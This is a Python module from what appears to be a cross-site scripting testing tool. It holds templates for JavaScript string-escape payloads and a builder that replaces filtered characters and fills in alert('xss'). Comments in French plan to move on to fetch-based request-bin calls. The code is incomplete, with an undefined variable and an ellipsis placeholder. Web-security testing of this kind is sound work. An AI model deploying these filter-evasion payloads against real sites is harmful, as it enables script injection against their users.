from models import AttackType, Payload, PayloadType, RequestModel, FilterModel
from modules.utils import *


BASE_PAYLOADS = {
    "ESCAPE_JS": [
        {
            "payload": """"; FUNCTION('ARGS'); var dummy= " """,
            "used_chars": ['"', ';','FUNCTION', '(', 'ARGS', ')', "'"]
        },
        {
            "payload": """'; FUNCTION("ARGS"); var dummy= ' """,
            "used_chars": ["'", ';','FUNCTION', '(', 'ARGS', ')', '"']
        }
    ]
}


def build_ESCAPE_JS_payload(requestModel: RequestModel, filterModel: FilterModel, lastTestedPayload: Payload) -> Payload:
    """
    Builds payloads for the ESCAPE_JS attack type
    """

    # TODO: a partir du dernier payload testé et des filtres, prendre le payload qui a le plus de chance de passer
    # par récurrence, on tend vers le payload qui passe
    
    payload_str =  ...
    for char in payload['used_chars']:
        if char in filterModel.filteredChars:
            # TODO: tous les tester petit à petit jusqu'à ce que le payload fonctionne
            payload_str = payload_str.replace(char, SPECIAL_CHARS['for_js_escape'][char][0])

        if char == "FUNCTION":
            # TODO: mettre toutes les fonctions equivalentes au alert, puis au fetch, 
            payload_str = payload_str.replace("FUNCTION", "alert")

        elif char == "ARGS":
            # TODO: mettre les arguments en fonction du type alert ou request bin
            payload_str = payload_str.replace("ARGS", "xss")

    return Payload(value=payload_str, payloadType=PayloadType.ALERT)


def get_payload_generator(attackType: AttackType) -> callable:
    """
    Returns the payload generator for the given attack type
    """
    if attackType == AttackType.ESCAPE_JS:
        return build_ESCAPE_JS_payload
    
    else:
        raise NotImplementedError(f"Attack type {attackType} not implemented yet")